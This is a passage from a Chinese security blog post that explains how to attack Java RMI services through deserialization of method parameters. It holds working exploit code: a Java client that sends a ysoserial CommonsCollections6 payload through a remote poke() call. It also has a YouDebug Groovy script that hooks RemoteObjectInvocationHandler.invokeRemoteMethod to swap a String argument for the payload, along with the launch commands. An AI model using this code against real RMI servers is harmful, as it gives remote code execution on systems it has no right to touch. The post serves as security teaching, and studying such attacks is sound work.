</span></span></code></pre></td></tr></table></div></div><p>可以看到，逻辑为：如果参数类型不是基本数据类型（isPrimitive）,就直接调用 <code>readObject()</code> 进行反序列化，由此造成攻击。</p><p>同时我们知道，String类型不是Java的基本参数类型，所以也会调用 <code>readObject()</code> 进行反序列化。</p><p>现在开始讲攻击手法：</p><p>对于参数类型为Object、Serializable类型的参数，直接调用接口的方法传递恶意序列化数据就行了。如下所示，攻击者首先从Registry获取Server中bind的ServiceStub，然后调用其poke方法，传递一个恶意的序列化对象，造成Server端RCE：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * @author : p1n93r
</span></span></span><span class=line><span class=cl><span class=cm> * @date : 2021/8/6 18:45
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>Attack</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>main</span><span class=o>(</span><span class=n>String</span><span class=o>[]</span> <span class=n>args</span><span class=o>)</span><span class=kd>throws</span> <span class=n>Exception</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Registry</span> <span class=n>registry</span> <span class=o>=</span> <span class=n>LocateRegistry</span><span class=o>.</span><span class=na>getRegistry</span><span class=o>(</span><span class=s>&#34;127.0.0.1&#34;</span><span class=o>,</span> <span class=n>1099</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>HelloService</span> <span class=n>hello</span> <span class=o>=</span> <span class=o>(</span><span class=n>HelloService</span><span class=o>)</span><span class=n>registry</span><span class=o>.</span><span class=na>lookup</span><span class=o>(</span><span class=s>&#34;hello&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>hello</span><span class=o>.</span><span class=na>poke</span><span class=o>(</span><span class=n>CC6</span><span class=o>.</span><span class=na>getPayload</span><span class=o>());</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/media/image-20210807203321837.png alt=image-20210807203321837></p><p>对于非基本参数类型的形参（常见的就是String类型），我们如何进行攻击呢？</p><p>我们攻击者作为Client，可以随意修改Client达到发送任意类型的数据给Server进行反序列化的目的。存在如下几个常见的手法：</p><ul><li>复制 <code>java.rmi</code> 包下的代码，并且修改里面的代码从而使得支持发送任意类型的数据；</li><li>通过debug模式，在对象被序列化之前，替换对象为恶意的对象；</li><li>使用 <code>javassist</code> 修改发送数据的代码；</li><li>直接修改网络数据流，将恶意序列化数据注入；</li></ul><p>这里比较方便和友好的操作就是使用第二种方式。并且还有一个很友好的工具提供给我们使用：<a href=http://youdebug.kohsuke.org/user-guide.html>YouDebug</a></p><p>当我们Client进行RMI调用的时候，底层是通过 <code>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod()</code> 来发送数据给远程Server的，首先看到代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>private</span> <span class=n>Object</span> <span class=nf>invokeRemoteMethod</span><span class=o>(</span><span class=n>Object</span> <span class=n>proxy</span><span class=o>,</span>
</span></span><span class=line><span class=cl>                                  <span class=n>Method</span> <span class=n>method</span><span class=o>,</span>
</span></span><span class=line><span class=cl>                                  <span class=n>Object</span><span class=o>[]</span> <span class=n>args</span><span class=o>)</span>
</span></span><span class=line><span class=cl>    <span class=kd>throws</span> <span class=n>Exception</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(!(</span><span class=n>proxy</span> <span class=k>instanceof</span> <span class=n>Remote</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=n>IllegalArgumentException</span><span class=o>(</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;proxy not Remote instance&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>ref</span><span class=o>.</span><span class=na>invoke</span><span class=o>((</span><span class=n>Remote</span><span class=o>)</span> <span class=n>proxy</span><span class=o>,</span> <span class=n>method</span><span class=o>,</span> <span class=n>args</span><span class=o>,</span>
</span></span><span class=line><span class=cl>                          <span class=n>getMethodHash</span><span class=o>(</span><span class=n>method</span><span class=o>));</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>Exception</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(!(</span><span class=n>e</span> <span class=k>instanceof</span> <span class=n>RuntimeException</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>cl</span> <span class=o>=</span> <span class=n>proxy</span><span class=o>.</span><span class=na>getClass</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>method</span> <span class=o>=</span> <span class=n>cl</span><span class=o>.</span><span class=na>getMethod</span><span class=o>(</span><span class=n>method</span><span class=o>.</span><span class=na>getName</span><span class=o>(),</span>
</span></span><span class=line><span class=cl>                                      <span class=n>method</span><span class=o>.</span><span class=na>getParameterTypes</span><span class=o>());</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>NoSuchMethodException</span> <span class=n>nsme</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=o>(</span><span class=n>IllegalArgumentException</span><span class=o>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>new</span> <span class=n>IllegalArgumentException</span><span class=o>().</span><span class=na>initCause</span><span class=o>(</span><span class=n>nsme</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>thrownType</span> <span class=o>=</span> <span class=n>e</span><span class=o>.</span><span class=na>getClass</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=o>(</span><span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>declaredType</span> <span class=o>:</span> <span class=n>method</span><span class=o>.</span><span class=na>getExceptionTypes</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=o>(</span><span class=n>declaredType</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>thrownType</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>throw</span> <span class=n>e</span><span class=o>;</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=n>e</span> <span class=o>=</span> <span class=k>new</span> <span class=n>UnexpectedException</span><span class=o>(</span><span class=s>&#34;unexpected exception&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=n>e</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到这个方法的逻辑，顾名思义就是调用远程方法，且第三个参数args，是一个数组，代表了调用的远程方法的参数值列表，所以我们可以通过YouDebug这个工具来hook这个方法，将传递的参数值修改为恶意的对象，Server端接收到后进行反序列化就会被攻击。</p><p>接下来介绍怎么通过使用YouDebug将String类型的参数值，修改成CC6 payload。</p><p>首先创建一个hack.groovy：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-groovy data-lang=groovy><span class=line><span class=cl><span class=c1>// YouDebug不支持传递参数值到脚本中
</span></span></span><span class=line><span class=cl><span class=c1>// 你可以在这里修改你需要的一些参数
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>def</span> <span class=n>payloadName</span> <span class=o>=</span> <span class=s2>&#34;CommonsCollections6&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=kt>def</span> <span class=n>payloadCommand</span> <span class=o>=</span> <span class=s2>&#34;calc&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=c1>// 这个代表你传递的String类型的参数值，待会hook到后将进行匹配判断，防止修改错参数
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>def</span> <span class=n>needle</span> <span class=o>=</span> <span class=s2>&#34;p1n93r&#34;</span>
</span></span><span class=line><span class=cl><span class=n>println</span> <span class=s2>&#34;Loaded...&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>// 在invokeRemoteMethod方法上设置断点，查找传递过来的String类型的参数值
</span></span></span><span class=line><span class=cl><span class=c1>// 在找到的参数值内匹配needle参数值，如果匹配到，则将其替换成反序列化payload
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>vm</span><span class=o>.</span><span class=na>methodEntryBreakpoint</span><span class=o>(</span><span class=s2>&#34;java.rmi.server.RemoteObjectInvocationHandler&#34;</span><span class=o>,</span> <span class=s2>&#34;invokeRemoteMethod&#34;</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>  <span class=n>println</span> <span class=s2>&#34;[+] java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod() is called&#34;</span>
</span></span><span class=line><span class=cl>  <span class=c1>// 注意：pyload class需要被YouDebug加载到
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>vm</span><span class=o>.</span><span class=na>loadClass</span><span class=o>(</span><span class=s2>&#34;ysoserial.payloads.&#34;</span> <span class=o>+</span> <span class=n>payloadName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>  <span class=c1>// 获取方法的第三个参数值，也就是args
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>delegate</span><span class=o>.</span><span class=s2>&#34;@2&#34;</span><span class=o>.</span><span class=na>eachWithIndex</span> <span class=o>{</span> <span class=n>arg</span><span class=o>,</span><span class=n>idx</span> <span class=o>-&gt;</span>
</span></span><span class=line><span class=cl>     <span class=n>println</span> <span class=s2>&#34;[+] Argument &#34;</span> <span class=o>+</span> <span class=n>idx</span> <span class=o>+</span> <span class=s2>&#34;: &#34;</span> <span class=o>+</span> <span class=n>arg</span><span class=o>[</span><span class=mi>0</span><span class=o>].</span><span class=na>toString</span><span class=o>();</span>
</span></span><span class=line><span class=cl>     <span class=k>if</span><span class=o>(</span><span class=n>arg</span><span class=o>[</span><span class=mi>0</span><span class=o>].</span><span class=na>toString</span><span class=o>().</span><span class=na>contains</span><span class=o>(</span><span class=n>needle</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>println</span> <span class=s2>&#34;[+] Needle &#34;</span> <span class=o>+</span> <span class=n>needle</span> <span class=o>+</span> <span class=s2>&#34; found, replacing String with payload&#34;</span> 
</span></span><span class=line><span class=cl>        <span class=c1>// 准备创建payload
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>def</span> <span class=n>payload</span> <span class=o>=</span> <span class=n>vm</span><span class=o>.</span><span class=na>_new</span><span class=o>(</span><span class=s2>&#34;ysoserial.payloads.&#34;</span> <span class=o>+</span> <span class=n>payloadName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=kt>def</span> <span class=n>payloadObject</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=na>getObject</span><span class=o>(</span><span class=n>payloadCommand</span><span class=o>)</span>
</span></span><span class=line><span class=cl>        <span class=n>vm</span><span class=o>.</span><span class=na>ref</span><span class=o>(</span><span class=s2>&#34;java.lang.reflect.Array&#34;</span><span class=o>).</span><span class=na>set</span><span class=o>(</span><span class=n>delegate</span><span class=o>.</span><span class=s2>&#34;@2&#34;</span><span class=o>,</span><span class=n>idx</span><span class=o>,</span> <span class=n>payloadObject</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>println</span> <span class=s2>&#34;[+] Done..&#34;</span>
</span></span><span class=line><span class=cl>     <span class=o>}</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>编写如下Client代码，调用Server的sayHello方法，传递的是一个String类型对象，后续通过YouDebug动态修改这个参数值为CC6 payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>Attack</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>main</span><span class=o>(</span><span class=n>String</span><span class=o>[]</span> <span class=n>args</span><span class=o>)</span><span class=kd>throws</span> <span class=n>Exception</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Registry</span> <span class=n>registry</span> <span class=o>=</span> <span class=n>LocateRegistry</span><span class=o>.</span><span class=na>getRegistry</span><span class=o>(</span><span class=s>&#34;127.0.0.1&#34;</span><span class=o>,</span> <span class=n>1099</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>HelloService</span> <span class=n>hello</span> <span class=o>=</span> <span class=o>(</span><span class=n>HelloService</span><span class=o>)</span><span class=n>registry</span><span class=o>.</span><span class=na>lookup</span><span class=o>(</span><span class=s>&#34;hello&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>hello</span><span class=o>.</span><span class=na>sayHello</span><span class=o>(</span><span class=s>&#34;p1n93r&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>然后使用如下参数启动你的Client：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Java</span> <span class=o>-</span><span class=n>agentlib</span><span class=o>:</span><span class=n>jdwp</span><span class=o>=</span><span class=n>transport</span><span class=o>=</span><span class=n>dt_socket</span><span class=o>,</span><span class=n>server</span><span class=o>=</span><span class=n>y</span><span class=o>,</span><span class=n>address</span><span class=o>=</span><span class=n>127</span><span class=o>.</span><span class=na>0</span><span class=o>.</span><span class=na>0</span><span class=o>.</span><span class=na>1</span><span class=o>:</span><span class=n>8000</span>
</span></span></code></pre></td></tr></table></div></div><p>如下所示：</p><p><img src=/media/image-20210808003434017.png alt=image-20210808003434017></p><p>最后启动YouDebug：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>java -jar youdebug-1.5.jar -socket 127.0.0.1:8000 hack.groovy
</span></span></code></pre></td></tr></table></div></div><p>如下图所示：</p><p><img src=/media/image-20210808003846721.png alt=image-20210808003846721></p><p>在Server端打断点，发现收到请求，准备进行调用readObject进行反序列化（type仍然为String，但是反序列化出来的对象不是String类型）：</p><p><img src=/media/image-20210808010337762.png alt=image-20210808010337762></p><p>Client收到Server端返回的错误信息（虽然提示mismatch，但是早就反序列化RCE了）：</p><p><img src=/media/image-20210808010644037.png alt=image-20210808010644037></p><h2 id=外部参考>外部参考</h2><ul><li><a href="https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1">https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1</a></li><li><a href=https://threedr3am.github.io/2020/03/03/%E6%90%9E%E6%87%82RMI%E3%80%81JRMP%E3%80%81JNDI-%E7%BB%88%E7%BB%93%E7%AF%87/>https://threedr3am.github.io/2020/03/03/%E6%90%9E%E6%87%82RMI%E3%80%81JRMP%E3%80%81JNDI-%E7%BB%88%E7%BB%93%E7%AF%87/</a></li><li><a href=https://threedr3am.github.io/2020/01/15/%E5%9F%BA%E4%BA%8EJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%20-%20%E6%90%9E%E6%87%82RMI%E3%80%81JRMP%E3%80%81JNDI/>https://threedr3am.github.io/2020/01/15/%E5%9F%BA%E4%BA%8EJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%20-%20%E6%90%9E%E6%87%82RMI%E3%80%81JRMP%E3%80%81JNDI/</a></li><li><a href=https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/>https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/</a></li></ul></div><div class=post-copyright><p class=copyright-item><span class=item-title>文章作者</span>
<span class=item-content>P1n93r</span></p><p class=copyright-item><span class=item-title>上次更新</span>
<span class=item-content>2021-07-04</span></p></div><footer class=post-footer><nav class=post-nav><a class=prev href=/post/security/unzip_slip/><i class="iconfont icon-left"></i>
<span class="prev-text nav-default">unzip_slip漏洞</span>
<span class="prev-text nav-mobile">上一篇</span></a>
<a class=next href=/post/security/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/><span class="next-text nav-default">Fastjson反序列化攻击</span>
<span class="next-text nav-mobile">下一篇</span>
<i class="iconfont icon-right"></i></a></nav></footer></article></div><div id=disqus_thread></div><script type=text/javascript>(function(){if(window.location.hostname==="localhost")return;var t,e=document.createElement("script");e.type="text/javascript",e.async=!0,t="p1n93r",e.src="//"+t+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript></div></main><footer id=footer class=footer><div class=social-links><a href=mailto:pin83r@gmail.com class="iconfont icon-email" title=email></a>
<a href=https://github.com/p1n93r class="iconfont icon-github" title=github></a>
<a href=https://p1n93r.github.io/index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a></div><div class=copyright><span class=power-by>由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动</span>
<span class=division>|</span>
<span class=theme-info>主题 -
<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span><div class=busuanzi-footer><span id=busuanzi_container_site_pv>本站总访问量 <span id=busuanzi_value_site_pv><img src=/img/spinner.svg alt=spinner.svg></span> 次</span>
<span class=division>|</span>
<span id=busuanzi_container_site_uv>本站总访客数 <span id=busuanzi_value_site_uv><img src=/img/spinner.svg alt=spinner.svg></span> 人</span></div><span class=copyright-year>&copy;
2019 -
2022<span class=heart><i class="iconfont icon-heart"></i></span><span>P1n93r</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script>
<script type=text/javascript src=/js/main.min.64437849d125a2d603b3e71d6de5225d641a32d17168a58106e0b61852079683.js></script></body></html>